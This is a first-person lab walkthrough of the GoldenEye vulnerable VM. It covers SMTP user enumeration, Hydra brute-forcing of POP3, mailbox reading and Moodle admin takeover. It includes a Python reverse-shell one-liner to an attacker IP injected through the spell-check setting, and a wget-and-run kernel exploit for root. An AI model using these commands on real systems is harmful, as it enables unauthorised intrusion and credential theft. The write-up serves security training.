# 🎯 GoldenEye — Full Lab Walkthrough

> Medium-level offensive security lab focusing on network enumeration, POP3/SMTP abuse, password attacks with Hydra, Moodle exploitation, and Linux privilege escalation.

⚠️ **Disclaimer:** All actions were performed on a deliberately vulnerable GoldenEye VM in a controlled lab environment. Never attack systems without explicit authorization.

---

## 🧪 Lab Setup

| Component        | Details                      |
|-----------------|------------------------------|
| Attacker        | Kali Linux                   |
| Target          | GoldenEye (TryHackMe/VulnHub) |
| Network         | Isolated lab / Host-only     |

---

## 📚 Table of Contents

1. Reconnaissance  
2. Service Enumeration  
3. POP3 Brute Force with Hydra  
4. Email Intelligence & Hidden Domain  
5. Moodle Access & Lateral Movement  
6. Foothold via Moodle Spell-Check  
7. Privilege Escalation  
8. Key Takeaways  

---

## 1. Reconnaissance

### Network discovery

```bash
sudo netdiscover -r 192.168.1.0/24
```

Identified the GoldenEye host in the local subnet.

### Initial Nmap scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key ports discovered (example):

| Port   | Service | Notes                           |
|--------|---------|---------------------------------|
| 25/tcp | SMTP    | Mail server, username leaks     |
| 80/tcp | HTTP    | Public GoldenEye-themed site    |
| 55006  | SSL     | POP3S                           |
| 55007  | POP3    | Cleartext POP3 (used with Hydra)|

Replace `<TARGET_IP>` with the actual IP of your GoldenEye VM.

---

## 2. Service Enumeration

### 2.1 SMTP enumeration (port 25)

```bash
nc <TARGET_IP> 25
VRFY boris
VRFY natalya
VRFY doak
```

Used SMTP verbs like `VRFY` / `EXPN` to identify valid users related to GoldenEye characters.

These usernames were saved for later password attacks.

### 2.2 HTTP (port 80)

Visited the web page:

```text
http://<TARGET_IP>
```

Reviewed page content and source for:

- References to internal usernames.  
- Encoded strings or hints to passwords.  
- Links hinting at internal services.

---

## 3. POP3 Brute Force with Hydra

Once ports `55006/55007` were identified as POP3/POP3S, I targeted POP3 on `55007` with **Hydra**.

### Hydra against POP3

Example attack (for user `boris`):

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 -f <TARGET_IP> pop3
```

Repeated similarly for other discovered users (e.g., `natalya`, `doak`).

Example valid credentials discovered during the lab:

| User    | Password      |
|---------|--------------|
| boris   | secret1!     |
| natalya | bird         |
| doak    | goat         |

These POP3 logins became the main pivot into email-based intelligence.

---

## 4. Email Intelligence & Hidden Domain

With working POP3 credentials, I logged into the mailboxes and read internal messages.

### POP3 interaction (example with `natalya`)

```bash
telnet <TARGET_IP> 55007
USER natalya
PASS bird
LIST
RETR 1
RETR 2
```

Emails revealed:

- Additional credentials for other users.  
- Mention of an internal domain, for example: `severnaya-station.com`.  

To resolve the internal hostname, I updated `/etc/hosts` on the attacker box:

```bash
sudo sh -c 'echo "<TARGET_IP> severnaya-station.com" >> /etc/hosts'
```

Then browsed:

```text
http://severnaya-station.com
```

This exposed a **Moodle** instance running on the target.

---

## 5. Moodle Access & Lateral Movement

Further POP3 enumeration (e.g., user `doak`) leaked credentials mapped to the Moodle application.

Example mapping discovered during the lab:

- POP3: `doak / goat`  
- Moodle: `dr_doak / 4England!`

### Moodle login

```text
http://severnaya-station.com
```

Logged in to Moodle as:

- **Username:** `dr_doak`  
- **Password:** `4England!`

Inside Moodle, under **My profile → My private files**, a file (e.g., `s3cret.txt`) referenced a hidden path such as:

```text
/dir00key/for-007.jpg
```

### Extracting secrets from the image

```bash
wget http://severnaya-station.com/dir00key/for-007.jpg
exiftool for-007.jpg
```

An EXIF field contained a Base64 string:

```text
eFdpbnRlcjE5OTV4IQ==
```

Decoded to:

```bash
echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d
xWinter1995x!
```

This password was then used as the **Moodle admin** password (user `admin`).

---

## 6. Foothold via Moodle Spell-Check

With Moodle admin access, I abused the **spell-check engine path** to execute a reverse shell.

### Configure malicious spell engine

In Moodle admin UI:

1. Go to: *Site administration → Plugins → Text editors → TinyMCE HTML editor*.  
2. Set **Spell engine** to `PSpellShell`.  
3. In the spell path/command field, inject a Python reverse shell one-liner.

Example reverse shell (adjust IP and port):

```bash
python -c 'import socket,subprocess,os;\
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
 s.connect(("<ATTACKER_IP>",4545));\
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
 subprocess.call(["/bin/sh","-i"]);'
```

On Kali, start a listener:

```bash
nc -lvnp 4545
```

Then in Moodle:

1. Go to *My profile → Blog → Add a new entry*.  
2. Type any content and click the **spell check** button.

The page may appear to hang while the injected command runs. The Netcat listener receives a shell as `www-data`.

Upgrade the TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 7. Privilege Escalation

With a low-privilege shell (`www-data`), I enumerated the system for escalation paths.

### Local enumeration

Common checks:

```bash
id
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

A vulnerable kernel (e.g., overlayfs-related) can often be exploited using a public local privilege escalation exploit.

Example workflow:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/37292.c
cc 37292.c -o exploit
chmod +x exploit
./exploit
```

If successful, this grants a root shell.

Retrieve the final flag (path varies by build):

```bash
cat /root/flag.txt
```

---

## 8. Key Takeaways

- Deep enumeration of **SMTP/POP3** exposes usernames and credentials that drive the whole attack chain.  
- **Email intelligence** often reveals internal domains and application logins (e.g., Moodle).  
- Web app **configuration abuse** (like Moodle spell-check) can be as dangerous as code vulnerabilities.  
- Keeping the OS and kernel patched is critical to prevent **local privilege escalation**.

---

*This walkthrough is for educational purposes only. Do not use these techniques on systems you do not own or explicitly control.*
